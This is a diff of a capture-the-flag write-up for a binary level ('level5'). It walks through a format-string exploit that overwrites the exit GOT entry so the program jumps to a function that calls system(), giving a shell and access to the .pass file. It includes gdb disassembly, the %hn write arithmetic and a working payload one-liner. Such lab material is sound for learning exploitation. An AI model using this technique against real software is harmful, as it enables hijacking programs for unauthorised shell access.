@@ -1,55 +1,29 @@
-format string again : here overwrite the exit@plt addr (Global Offset Table) 
+We look at the GOT table and find the address of <exit>
 
-(gdb) disassemble n
-Dump of assembler code for function n:
-   0x080484c2 <+0>:	push   %ebp
-   0x080484c3 <+1>:	mov    %esp,%ebp
-   0x080484c5 <+3>:	sub    $0x218,%esp
-   0x080484cb <+9>:	mov    0x8049848,%eax
-   0x080484d0 <+14>:	mov    %eax,0x8(%esp)
-   0x080484d4 <+18>:	movl   $0x200,0x4(%esp)
-   0x080484dc <+26>:	lea    -0x208(%ebp),%eax
-   0x080484e2 <+32>:	mov    %eax,(%esp)
-   0x080484e5 <+35>:	call   0x80483a0 <fgets@plt>
-   0x080484ea <+40>:	lea    -0x208(%ebp),%eax
-   0x080484f0 <+46>:	mov    %eax,(%esp)
-   0x080484f3 <+49>:	call   0x8048380 <printf@plt>  <-- breakp here
-   0x080484f8 <+54>:	movl   $0x1,(%esp)
-   0x080484ff <+61>:	call   0x80483d0 <exit@plt>  <-- bp here 
+$ objdump -R ./level5
+...
+08049838 R_386_JUMP_SLOT   exit
+...
 
-(gdb) disassemble 0x80483d0
-Dump of assembler code for function exit@plt:
-   0x080483d0 <+0>:	jmp    *0x8049838   <-- :) 
-   0x080483d6 <+6>:	push   $0x28
-   0x080483db <+11>:	jmp    0x8048370
-End of assembler dump.
+The function <o> calls <system> but is never executed
 
-(gdb) x 0x8049838
-0x8049838 <exit@got.plt>:	0x080483d6
+$ (gdb) disas o
+...
+0x080484b1 <+13>:	call   0x80483b0 <system@plt>
+...
 
-(gdb) disassemble o
-Dump of assembler code for function o:
-   0x080484a4 <+0>:	push   %ebp
-   0x080484a5 <+1>:	mov    %esp,%ebp
-   0x080484a7 <+3>:	sub    $0x18,%esp
-   0x080484aa <+6>:	movl   $0x80485f0,(%esp)
-   0x080484b1 <+13>:	call   0x80483b0 <system@plt>
-   0x080484b6 <+18>:	movl   $0x1,(%esp)
-   0x080484bd <+25>:	call   0x8048390 <_exit@plt>
+The idea is to replace the call to <exit> in the <n> function by a call to <o>
+Playing around with printf we notice that we control the 4th argument on the stack.
+But, we cannot pipe 134513828 bytes at once so we split the value 0x080484a4 into 0x0804 (2052) and 0x84a4 (33956)
 
-(gdb) set {int}0x08049838=0x080484a4 (replace exit with o() )
+The formula is then :
+	<addr+2>		: for the high part of the target address
+	<addr>			: for the low part of the target address
+	<2052-8)>		: 0x0804 minus the 8 bytes of the 1st address
+	<%4$hn>			: write it at 1st address as 12th argument on the stack
+	<33956-2044)>	: 0x84a4 minus the 2044 bytes already printed
+	<%5$hn>			: write it at 2nd address as 13th argument on the stack
 
-(gdb) c 
+Then launch the terminal and get access to .pass file
 
-wegot a shell ! do the same with python :  
-
-
-o = 0x080484a4
-exit_plt = 0x8049838
-
-0x080484a4
-0x0804 = 2052 ->(-8)  = 2044
-0x84a4 = 33956 -> (- 2052 - 8) = 31896
-
-
-cat <(python -c 'print "\x08\x04\x98\x3a"[::-1] + "\x08\x04\x98\x38"[::-1] + "%2044d%4$hn" + "%31904d%5$hn"') - | ./level5
+$ cat <(python -c "print('\x3a\x98\x04\x08' + '\x38\x98\x04\x08' + '%2044d' + '%4\$hn' + '%31904d' + '%5\$hn')") - | ./level5
